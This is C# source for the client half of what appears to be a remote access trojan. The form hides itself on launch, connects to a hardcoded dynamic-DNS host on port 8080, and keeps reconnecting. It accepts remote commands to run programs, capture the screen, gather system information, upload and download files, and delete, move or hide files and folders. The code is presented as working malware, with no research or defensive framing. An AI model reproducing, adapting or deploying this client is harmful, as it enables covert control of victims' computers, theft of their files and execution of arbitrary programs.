using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
namespace Client
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
            this.Hide();
        }
        Socket ClientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private bool IsConnected()
        {
            try
            {
                return !(ClientSocket.Poll(1, SelectMode.SelectRead) && ClientSocket.Available == 0);
            }
            catch (SocketException) { return false; }
        }
        private void StartClient()
        {           
            try
            {
                //ClientSocket.Connect(new IPEndPoint(IPAddress.Parse("5.152.214.244"), 8080));
                ClientSocket.Connect(new IPEndPoint(IPAddress.Parse("mahdi72.ddns.net"), 8080));
                Thread TR_client = new Thread(delegate(object unused) { GetData(); });
                TR_client.IsBackground = true;
                TR_client.Start();
            }
            catch
            {
                System.Threading.Thread.Sleep(5000);
                StartClient();
            }

        }
        private void GetData()
        {
            while (true)
            {
                try
                {
                    
                    byte[] b = new byte[5 * 1024 * 1024];
                    int r = ClientSocket.Receive(b);
                    if (r > 0)
                    {
                        string c = Encoding.Unicode.GetString(b);
                        int cmd_len = int.Parse(Encoding.Unicode.GetString(b, 0, 16));
                        string cmd = Encoding.Unicode.GetString(b, 16, cmd_len);
                        string[] cmd2 = cmd.Split('|');
                        string commandName = cmd2[0];
                        string commandParameters = cmd2[1];

                        switch (commandName)
                        {
                            case "system.information": Classes.Commands.SystemInformatin(ClientSocket);
                                break;
                            case "run": Classes.Commands.run_program(commandParameters);
                                break;
                            case "exit": Classes.Commands.exitApp(commandParameters);
                                break;
                            case "system.screen": Classes.Commands.GetDesktopScreen(ClientSocket, commandParameters);
                                break;
                            case "io.drive": Classes.Commands.LoadRemoteDrives(ClientSocket);
                                break;
                            case "io.entries": Classes.Commands.LoadRemoteEntries(ClientSocket, commandParameters);
                                break;
                            case "io.createdirectory": CreateDirectory(commandParameters);
                                break;
                            case "io.createfile": CreateFile(commandParameters);
                                break;
                            case "io.renamefile": RenameFile(commandParameters);
                                break;
                            case "io.renamedirectory": RenameDirectory(commandParameters);
                                break;
                            case "io.copyfile": CopyFile(commandParameters);
                                break;
                            case "io.movefile": MoveFile(commandParameters);
                                break;
                            case "io.movedirectory": MoveDirectory(commandParameters);
                                break;
                            case "io.deletefile": DeleteFile(commandParameters);
                                break;
                            case "io.deletedirectory": DeleteDirectory(commandParameters);
                                break;
                            case "io.fileattribute": FileAttribute(commandParameters);
                                break;
                            case "io.directoryattribute": DirectoryAttribute(commandParameters);
                                break;
                            case "uploadfile":
                                byte[] ddd = new byte[r - 16 - cmd_len];
                                Array.Copy(b, 16 + cmd_len, ddd, 0, r - 16 - cmd_len);
                                Classes.Commands.SaveFile(commandParameters, ddd);
                                break;
                            case "downloadfile":
                                string[] ttt = commandParameters.Split('<');
                                Classes.Commands.UploadFile(ClientSocket, ttt[0], ttt[1]);
                                break;
                            case "editfile":
                                Classes.Commands.SendFileForEdit(ClientSocket, commandParameters);
                                break;
                            case "editfile_save":
                                 string[] tttt=commandParameters.Split('<');
                                 File.Delete(tttt[0]);
                                 File.WriteAllText(tttt[0], tttt[1]);
                                break;
                        }
                    }
                }
                catch
                {
                   
                    if (!IsConnected())
                    {
                        System.Threading.Thread.Sleep(5000);
                        StartClient();
                    }
                }
            }
        }
        private void MainForm_Load(object sender, EventArgs e)
        {
            Thread TR_client = new Thread(delegate(object unused) { StartClient(); });
            TR_client.IsBackground = true;
            TR_client.Start();
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                if (ClientSocket != null) ClientSocket.Close();
                System.Environment.Exit(System.Environment.ExitCode);
            }
            catch
            {

            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //Classes.Commands.GetDesktopScreen(null, "800<600<1");
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            // e.Cancel = true;
        }
        //============================================================================
        private void CreateDirectory(string path)
        {
            try
            {
                Directory.CreateDirectory(path);
            }
            catch
            {

            }
        }
        //============================================================================
        private void CreateFile(string path)
        {
            try
            {
                File.Create(path);
            }
            catch
            {

            }
        }
        //============================================================================
        private void RenameFile(string attr)
        {
            try
            {
                string[] vvv = attr.Split('<');
                string path = vvv[0];
                string name = vvv[1];
                string p = Path.GetDirectoryName(vvv[0]);
                File.Move(vvv[0], p + "\\" + vvv[1]);
            }
            catch
            {

            }
        }
        //============================================================================
        private void RenameDirectory(string attr)
        {
            try
            {
                string[] vvv = attr.Split('<');
                string path = vvv[0];
                string name = vvv[1];
                string p = Path.GetDirectoryName(path);
                Directory.Move(path, p + "\\" + name);
            }
            catch
            {

            }
        }
        //============================================================================
        private void CopyFile(string attr)
        {
            try
            {
                string[] vvv = attr.Split('<');
                string path = vvv[0];
                string target = vvv[1];
                File.Copy(path, target);
            }
            catch
            {

            }
        }
        //============================================================================
        private void MoveFile(string attr)
        {
            try
            {
                string[] vvv = attr.Split('<');
                string path = vvv[0];
                string target = vvv[1];
                File.Move(path, target);
            }
            catch
            {

            }

        }
        //============================================================================
        private void MoveDirectory(string attr)
        {
            try
            {
                string[] vvv = attr.Split('<');
                string path = vvv[0];
                string target = vvv[1];
                Directory.Move(path, target);
            }
            catch
            {

            }
        }
        //============================================================================
        private void DeleteFile(string path)
        {
            try
            {
                File.Delete(path);
            }
            catch
            {

            }
        }
        //============================================================================
        private void DeleteDirectory(string path)
        {
            try
            {
                Directory.Delete(path);
            }
            catch
            {

            }
        }
        //============================================================================
        private void FileAttribute(string attr)
        {
            try
            {
                string[] vvv = attr.Split('<');
                string path = vvv[0];
                string name = vvv[1];
                string a1 = name.Substring(0, 1);
                string a2 = name.Substring(1, 1);
                string a3 = name.Substring(2, 1);
                if (name == "000")
                {
                    File.SetAttributes(path, FileAttributes.Archive);
                }
                if (name == "111")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
                }
                if (name == "010")
                {
                    File.SetAttributes(path, FileAttributes.Hidden);
                }
                if (name == "100")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly);
                }
                if (name == "001")
                {
                    File.SetAttributes(path, FileAttributes.System);
                }
                if (name == "110")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.Hidden);
                }
                if (name == "101")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.System);
                }
                if (name == "011")
                {
                    File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
                }
            }
            catch { }

        }
        //============================================================================
        private void DirectoryAttribute(string attr)
        {
            try
            {
                string[] vvv = attr.Split('<');
                string path = vvv[0];
                string name = vvv[1];
                string a1 = name.Substring(0, 1);
                string a2 = name.Substring(1, 1);
                string a3 = name.Substring(2, 1);
                if (name == "000")
                {
                    File.SetAttributes(path, FileAttributes.Archive);
                }
                if (name == "111")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
                }
                if (name == "010")
                {
                    File.SetAttributes(path, FileAttributes.Hidden);
                }
                if (name == "100")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly);
                }
                if (name == "001")
                {
                    File.SetAttributes(path, FileAttributes.System);
                }
                if (name == "110")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.Hidden);
                }
                if (name == "101")
                {
                    File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.System);
                }
                if (name == "011")
                {
                    File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
                }
            }
            catch { }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
           
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {
            //if (!Classes.Commands.SendTestData(ClientSocket))
            //{
            //    MessageBox.Show("disconnected");
            //}
        }
        //============================================================================
    }
}
